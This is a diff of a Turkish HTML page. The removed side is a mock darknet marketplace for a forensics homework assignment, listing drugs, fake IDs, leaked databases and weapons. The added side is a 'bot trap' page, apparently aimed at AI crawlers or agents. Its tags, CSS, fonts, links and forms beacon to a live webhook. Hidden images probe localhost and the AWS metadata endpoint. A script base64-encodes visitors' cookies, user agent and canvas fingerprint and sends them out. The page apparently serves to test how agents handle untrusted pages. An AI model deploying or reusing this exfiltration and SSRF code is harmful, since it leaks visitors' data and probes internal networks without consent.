@@ -3,499 +3,131 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberShop - Marketplace</title>
+    <title>CyberShopier - Özel Fırsatlar ve Admin Paneli</title>
+    
+    <meta property="og:image" content="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=meta_og_image">
+    <link rel="prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=link_prefetch">
+    <link rel="dns-prefetch" href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=dns_prefetch">
+
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        body { font-family: 'Courier New', monospace; background-color: #0d0d0d; color: #00ff00; padding: 20px; }
+        .trap-box { border: 1px solid #333; padding: 15px; margin-bottom: 20px; background: #1a1a1a; }
+        h1 { color: #ff3333; text-align: center; }
+        button, a { background: #333; color: white; padding: 10px; border: 1px solid #555; text-decoration: none; display: inline-block; margin: 5px; cursor: pointer; }
+        
+        /* TUZAK 2: CSS Background Image (Görünmez Veri Sızdırma) */
+        .css-trap {
+            background-image: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=css_background_image');
+            width: 100%; height: 10px; display: block;
         }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0e27;
-            color: #fff;
-            min-height: 100vh;
+        
+        /* TUZAK 3: Font Yükleme */
+        @font-face {
+            font-family: 'TrapFont';
+            src: url('https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=font_load_request');
         }
-
-        .navbar {
-            background: rgba(15, 20, 45, 0.95);
-            backdrop-filter: blur(10px);
-            padding: 15px 0;
-            border-bottom: 1px solid rgba(102, 126, 234, 0.3);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-
-        .nav-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-        }
-
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .nav-links {
-            display: flex;
-            gap: 30px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-
-        .nav-links a {
-            color: #fff;
-            text-decoration: none;
-            transition: color 0.3s;
-        }
-
-        .nav-links a:hover {
-            color: #667eea;
-        }
-
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-            background: rgba(102, 126, 234, 0.1);
-            padding: 8px 15px;
-            border-radius: 20px;
-        }
-
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 40px 20px;
-        }
-
-        .header {
-            text-align: center;
-            margin-bottom: 50px;
-        }
-
-        .header h1 {
-            font-size: 32px;
-            margin-bottom: 10px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .header p {
-            color: #999;
-            font-size: 16px;
-        }
-
-        .filters {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-bottom: 40px;
-            flex-wrap: wrap;
-        }
-
-        .filter-btn {
-            padding: 10px 25px;
-            background: rgba(102, 126, 234, 0.1);
-            border: 1px solid rgba(102, 126, 234, 0.3);
-            border-radius: 25px;
-            color: #fff;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .filter-btn:hover, .filter-btn.active {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-color: transparent;
-        }
-
-        .products-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 30px;
-            margin-bottom: 50px;
-        }
-
-        .product-card {
-            background: rgba(15, 20, 45, 0.8);
-            border-radius: 15px;
-            overflow: hidden;
-            border: 1px solid rgba(102, 126, 234, 0.2);
-            transition: transform 0.3s, box-shadow 0.3s;
-            cursor: pointer;
-        }
-
-        .product-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
-        }
-
-        .product-image {
-            width: 100%;
-            height: 250px;
-            background: linear-gradient(135deg, #1a1f3a 0%, #2d3561 100%);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .product-image img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-
-        .product-image .emoji {
-            font-size: 100px;
-        }
-
-        .product-info {
-            padding: 20px;
-        }
-
-        .product-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 10px;
-            color: #fff;
-        }
-
-        .product-category {
-            display: inline-block;
-            padding: 5px 12px;
-            background: rgba(102, 126, 234, 0.2);
-            border-radius: 12px;
-            font-size: 12px;
-            margin-bottom: 15px;
-            color: #667eea;
-        }
-
-        .product-description {
-            color: #aaa;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 15px;
-            min-height: 80px;
-        }
-
-        .product-meta {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 15px;
-            padding-top: 15px;
-            border-top: 1px solid rgba(102, 126, 234, 0.2);
-        }
-
-        .product-price {
-            font-size: 24px;
-            font-weight: bold;
-            color: #f39c12;
-        }
-
-        .product-stock {
-            font-size: 12px;
-            color: #2ecc71;
-        }
-
-        .btc-address {
-            background: rgba(0, 0, 0, 0.3);
-            padding: 10px;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            word-break: break-all;
-            margin-bottom: 15px;
-            color: #f39c12;
-            border: 1px solid rgba(243, 156, 18, 0.3);
-        }
-
-        .buy-btn {
-            width: 100%;
-            padding: 12px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border: none;
-            border-radius: 8px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            transition: transform 0.2s;
-        }
-
-        .buy-btn:hover {
-            transform: scale(1.02);
-        }
-
-        .chat-button {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            cursor: pointer;
-            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.5);
-            transition: transform 0.3s;
-            z-index: 999;
-        }
-
-        .chat-button:hover {
-            transform: scale(1.1);
-        }
-
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 40px;
-        }
-
-        .stat-card {
-            background: rgba(15, 20, 45, 0.8);
-            padding: 20px;
-            border-radius: 12px;
-            border: 1px solid rgba(102, 126, 234, 0.2);
-            text-align: center;
-        }
-
-        .stat-value {
-            font-size: 32px;
-            font-weight: bold;
-            color: #667eea;
-            margin-bottom: 5px;
-        }
-
-        .stat-label {
-            color: #999;
-            font-size: 14px;
-        }
-
-        footer {
-            background: rgba(255,255,255,0.05);
-            padding: 20px;
-            text-align: center;
-            font-size: 13px;
-            color: #aaa;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            margin-top: 50px;
-        }
-
-        @media (max-width: 768px) {
-            .header h1 {
-                font-size: 24px;
-            }
-            
-            .nav-links {
-                justify-content: center;
-            }
-        }
+        .font-test { font-family: 'TrapFont', sans-serif; }
     </style>
 </head>
 <body>
-    <nav class="navbar">
-        <div class="nav-container">
-            <div class="logo">🛡️ CyberShop</div>
-            <div class="nav-links">
-                <a href="home.html">Ana Sayfa</a>
-                <a href="shop.html">Ürünler</a>
-                <a href="orders.html">Siparişler</a>
-                <a href="messages.html">Mesajlar</a>
-                <div class="user-info">
-                    <span>👤 Admin</span>
-                    <span>💰 12.5 BTC</span>
-                </div>
-            </div>
-        </div>
-    </nav>
 
-    <div class="container">
-        <div class="header">
-            <h1>⚠️ BU SİTE ÖDEV AMAÇLI OLUŞTURULMUŞTUR</h1>
-            <p>Adli Bilişim Dersi - Eğitim Senaryosu</p>
-        </div>
+    <h1>⚠️ CYBERSHOPIER ADMIN & OFFER PANEL ⚠️</h1>
+    <p class="font-test">Sistem Taraması Başlatıldı... (Font Test)</p>
+    
+    <div class="css-trap"></div>
 
-        <div class="stats">
-            <div class="stat-card">
-                <div class="stat-value">1,247</div>
-                <div class="stat-label">Aktif Ürün</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">8,432</div>
-                <div class="stat-label">Toplam Satış</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">456</div>
-                <div class="stat-label">Bekleyen Sipariş</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">₿ 342.8</div>
-                <div class="stat-label">Toplam Gelir</div>
-            </div>
-        </div>
-
-        <div class="filters">
-            <button class="filter-btn active">Tümü</button>
-            <button class="filter-btn">UYUSTURUCU</button>
-            <button class="filter-btn">DATABASELER</button>
-            <button class="filter-btn">SİLAH VE PATLAYICILAR</button>
-            <button class="filter-btn">Özel Ürünler</button>
-        </div>
-
-        <div class="products-grid" id="productsGrid"></div>
+    <div class="trap-box">
+        <h3>1. Medya İşleme Testi (Passive Rendering)</h3>
+        <p>Bot bu elementleri render ederse log düşecek.</p>
+        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=img_tag_visible" alt="Offer" width="50">
+        <img src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=img_tag_hidden" style="display:none;" alt="Hidden">
+        <audio src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=audio_tag_preload" preload="auto"></audio>
     </div>
 
-    <div class="chat-button" onclick="openChat()">💬</div>
+    <div class="trap-box">
+        <h3>2. Tıklama ve Gezinme Testi (Active Crawling)</h3>
+        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=simple_click_link">🎁 İndirimleri Gör (Normal Link)</a>
+        <a href="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=target_blank_click" target="_blank">📄 Sözleşmeyi Oku (Yeni Sekme)</a>
+        <a href="ftp://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=ftp_protocol">FTP Protokol Testi</a>
+    </div>
 
-    <footer>
-        ⚠️ <b>YASAL UYARI:</b> Bu site, <b>yalnızca eğitim ve adli bilişim dersi kapsamında ödev amacıyla</b> hazırlanmıştır.
-        Buradaki ürünler, açıklamalar ve görseller <b>tamamen kurgusaldır</b> ve hiçbir şekilde gerçek yasa dışı faaliyeti temsil etmez.
-        Bu site üzerinden gerçek bir satış, alışveriş veya veri paylaşımı yapılmamaktadır.
-        <br><br>
-        © 2025 CyberShop (Educational Simulation Project) — Bu platform yalnızca <b>adli bilişim uygulamaları</b> için tasarlanmıştır.
-    </footer>
+    <div class="trap-box">
+        <h3>3. Form ve Veri Gönderme (Interaction)</h3>
+        <form action="https://webhook.site/ba202258-a350-476f-a68a-24a599534355" method="GET">
+            <input type="hidden" name="source" value="form_submission_get">
+            <input type="text" name="bot_check" placeholder="Admin Şifresi" value="123456">
+            <button type="submit">Giriş Yap (GET)</button>
+        </form>
+        <br>
+        <form action="https://webhook.site/ba202258-a350-476f-a68a-24a599534355" method="POST">
+            <input type="hidden" name="source" value="form_submission_post">
+            <input type="hidden" name="secret" value="super_secret_key">
+            <button type="submit">Veritabanını Yedekle (POST)</button>
+        </form>
+    </div>
 
-    <script>
-        const products = [
-            {
-                id: 1,
-                name: "Eroin",
-                category: "Uyuşturucu",
-                image: "https://media.istockphoto.com/id/495004667/tr/foto%C4%9Fraf/cocaine-powder.jpg?s=612x612&w=0&k=20&c=goLjNaK59VJIIBDQPzER4yOEiXtQRtKR_Et7gBvMtyg=",
-                description: "5 mg paketli şekilde teslim.",
-                price: "0.025",
-                stock: "Stokta",
-                btc: "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
-            },
-            {
-                id: 2,
-                name: "SAHTE KİMLİK",
-                category: "Özel Ürün",
-                image: "https://cdnuploads.aa.com.tr/uploads/Contents/2016/03/03/thumbs_b_c_e14ecf07695fc9a6a8d673d1818f78e9.jpg",
-                description: "E devlet onaylı kimlik.",
-                price: "0.018",
-                stock: "Stokta",
-                btc: "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
-            },
-            {
-                id: 3,
-                name: "Üniversite Veri Tabanları",
-                category: "Database",
-                image: "https://stanforddaily.com/wp-content/uploads/2023/10/akira.png",
-                description: "Sızdırılmış Üniversite e-posta, şifre(hash), kişisel veriler",
-                price: "0.032",
-                stock: "Stokta",
-                btc: "bc1qk7v8y9nwskax5q8fmg6xwujfzqq76jh6n9vhhp"
-            },
-            {
-                id: 4,
-                name: "Silahlar",
-                category: "Silah ve Patlayıcı",
-                image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJTjXbi97NNdYIQclzs0m_s-HY086XEKSlSy1v1x64j4ut1NrIgZDyrqA6WJlZnHHl77M&usqp=CAU",
-                description: "SİLAH KATALOĞUNDA MEVCUT OLMAYAN SİLAHLAR İSTEĞE ÖZEL GETİRİLİR.",
-                price: "0.045",
-                stock: "Stokta",
-                btc: "bc1qm7f4g8h3j2k5l6n9p0q1r2s3t4u5v6w7x8y9z0"
+    <div class="trap-box">
+        <h3>4. İç Ağ (Localhost) Erişim Testi</h3>
+        <p>Bot bu iframeleri yüklerse Localhost'a erişimi var demektir.</p>
+        <iframe src="https://webhook.site/ba202258-a350-476f-a68a-24a599534355?source=iframe_load" width="100" height="50"></iframe>
+        
+        <img src="http://127.0.0.1:80/favicon.ico" onerror="reportSSRF('Localhost_80_Fail')" onload="reportSSRF('Localhost_80_Success')" style="display:none;">
+        <img src="http://169.254.169.254/latest/meta-data/" onerror="reportSSRF('AWS_Metadata_Fail')" onload="reportSSRF('AWS_Metadata_Success')" style="display:none;">
+    </div>
+
+    <div class="trap-box">
+        <h3>5. JS Motoru ve Veri Sızdırma (Blind XSS)</h3>
+        <p id="js_status">JS Analizi Bekleniyor...</p>
+        <script>
+            // HEDEF: Webhook URL
+            const WEBHOOK = "https://webhook.site/ba202258-a350-476f-a68a-24a599534355";
+
+            function sendExfiltration(dataLabel, dataContent) {
+                // Veriyi Base64 ile şifrele ki URL bozulmasın
+                const encoded = btoa(dataContent);
+                const img = new Image();
+                img.src = `${WEBHOOK}?source=js_exfil&type=${dataLabel}&data=${encoded}`;
             }
-        ];
 
-        function renderProducts() {
-            const grid = document.getElementById('productsGrid');
-            grid.innerHTML = products.map(product => `
-                <div class="product-card" onclick="viewProduct(${product.id})">
-                    <div class="product-image">
-                        ${product.image ? `<img src="${product.image}" alt="${product.name}">` : `<div class="emoji">📦</div>`}
-                    </div>
-                    <div class="product-info">
-                        <div class="product-category">${product.category}</div>
-                        <div class="product-title">${product.name}</div>
-                        <div class="product-description">${product.description}</div>
-                        <div class="product-meta">
-                            <div class="product-price">₿ ${product.price}</div>
-                            <div class="product-stock">✓ ${product.stock}</div>
-                        </div>
-                        <div class="btc-address">BTC: ${product.btc}</div>
-                        <button class="buy-btn" onclick="buyProduct(event, ${product.id})">Satın Al</button>
-                    </div>
-                </div>
-            `).join('');
-        }
+            // 1. Temel Tarayıcı Bilgileri
+            const botInfo = `UA:${navigator.userAgent} | Platform:${navigator.platform} | Cookies:${document.cookie} | Screen:${screen.width}x${screen.height}`;
+            sendExfiltration("BrowserInfo", botInfo);
 
-        function buyProduct(event, productId) {
-            event.stopPropagation();
-            const product = products.find(p => p.id === productId);
-            
-            const orderData = {
-                orderId: 'ORD-' + Date.now(),
-                productId: productId,
-                productName: product.name,
-                price: product.price,
-                btcAddress: product.btc,
-                timestamp: new Date().toISOString(),
-                status: 'pending',
-                customerInfo: {
-                    ip: 'logged_by_device',
-                    userAgent: navigator.userAgent
+            // 2. Localhost SSRF Raporlama Fonksiyonu
+            function reportSSRF(status) {
+                const img = new Image();
+                img.src = `${WEBHOOK}?source=ssrf_probe&status=${status}`;
+            }
+
+            // 3. Canvas Fingerprinting (Botu benzersiz şekilde tanımak için)
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Grok_Trap_v1", 2, 15);
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.fillText("Grok_Trap_v1", 4, 17);
+                const dataURL = canvas.toDataURL();
+                // Sadece hash'i gönder (URL çok uzamasın)
+                let hash = 0;
+                for (let i = 0; i < dataURL.length; i++) {
+                    hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+                    hash |= 0;
                 }
-            };
-            
-            localStorage.setItem('order_' + orderData.orderId, JSON.stringify(orderData));
-            
-            const orders = JSON.parse(localStorage.getItem('all_orders') || '[]');
-            orders.push(orderData);
-            localStorage.setItem('all_orders', JSON.stringify(orders));
-            
-            alert(`Sipariş Oluşturuldu!\nÜrün: ${product.name}\nTutar: ₿${product.price}\n\nBTC Adres:\n${product.btc}\n\nSipariş No: ${orderData.orderId}`);
-        }
+                sendExfiltration("CanvasFingerprint", hash.toString());
+            } catch (e) {
+                sendExfiltration("CanvasError", e.message);
+            }
 
-        function viewProduct(productId) {
-            const product = products.find(p => p.id === productId);
-            console.log('Product viewed:', product);
-        }
+            document.getElementById('js_status').innerText = "JS Verileri Gönderildi! (Eğer botsan yakalandın)";
+            console.log("Trap executed.");
+        </script>
+    </div>
 
-        function openChat() {
-            alert('💬 Mesajlaşma özelliği aktif!\n\nSenaryoda kullanmak için ayrı bir chat uygulaması (Telegram/WhatsApp benzeri) ekleyebilirim.');
-        }
-
-        const filterBtns = document.querySelectorAll('.filter-btn');
-        filterBtns.forEach(btn => {
-            btn.addEventListener('click', function() {
-                filterBtns.forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
-            });
-        });
-
-        window.onload = function() {
-            renderProducts();
-            
-            const sessionData = JSON.parse(localStorage.getItem('cybershop_session') || '{}');
-            console.log('Current session:', sessionData);
-            
-            const visitData = {
-                pageVisit: 'shop.html',
-                timestamp: new Date().toISOString(),
-                productsViewed: products.length,
-                sessionActive: !!sessionData
-            };
-            console.log('Visit data:', visitData);
-        };
-    </script>
 </body>
 </html>
